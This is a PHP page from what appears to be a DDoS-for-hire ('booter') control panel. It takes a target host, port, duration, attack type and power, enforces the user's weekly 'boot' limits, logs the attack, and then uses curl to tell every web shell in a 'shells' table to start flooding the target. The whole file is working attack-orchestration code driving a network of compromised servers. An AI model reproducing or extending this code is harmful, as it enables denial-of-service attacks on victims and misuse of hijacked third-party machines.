<?PHP
	require_once("header.php");
	if(isset($_POST['domain'])){
		$domain = $_POST['domain'];
		$result = gethostbyname($domain);
		$smarty->assign("domain", $result);
	}else{
		$smarty->assign("domain", "");
	}
	if(isset($_POST['host']) and ($_POST['port']) and ($_POST['time']) and ($_POST['type']) and ($_POST['power'])){
		$host = clean($_POST['host']);
		$port = clean($_POST['port']);
		$time = clean($_POST['time']);
		$type = clean($_POST['type']);
		$power = clean($_POST['power']);
		$result = mysql_query ("SELECT * FROM `blacklist`"); 
		while ($new = mysql_fetch_assoc($result)){
			$ip = $new['ip'];
			if($ip==$host){
				$error = "The IP ".$host." is on are blacklist.";
				$smarty->assign("attack", $error);
			}
		}
		$max = $_SESSION['SESS_max'] + 1;
		if($time>=$max){
			$error = "Your max boot time is ".$_SESSION['SESS_max'];
			$smarty->assign("attack", $error);
		}elseif($_SESSION['SESS_attacks']<=0){
			$error = "You have no boots left for this week!";
			$smarty->assign("attack", $error);
		}elseif($power>=101){
			$error = "Max power is 100%";
			$smarty->assign("attack", $error);
		}
		if($error==""){
			$ip = getenv("REMOTE_ADDR");
			$date = date("m.d.y"); 
			$username = $_SESSION['SESS_login'];
			mysql_query("INSERT INTO `logs` (`username`, `ip`, `action`, `date`) VALUES ('$username', '$ip', 'Attack Started on $host for $time', '$date');");
			$curl = "?host=".$host."&port=".$port."&time=".$time."&type=".$type;
			$result = mysql_query ("SELECT * FROM shells"); 
			while ($row = mysql_fetch_assoc($result)){
				$url = clean($row['url'].$curl);
				$ch = curl_init();
				$timeout = 1;
				curl_setopt($ch,CURLOPT_URL,$url);
				curl_setopt($ch, CURLOPT_TIMEOUT, 1);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				$data = curl_exec($ch);
				curl_close($ch);
				
			}
			$smarty->assign("attack", "Attack started on ".$host);
		}
	}else{
		$smarty->assign("attack", "");
	}
	
	$smarty->display("class.hub.tpl");
	$smarty->display("class.footer.tpl");
?>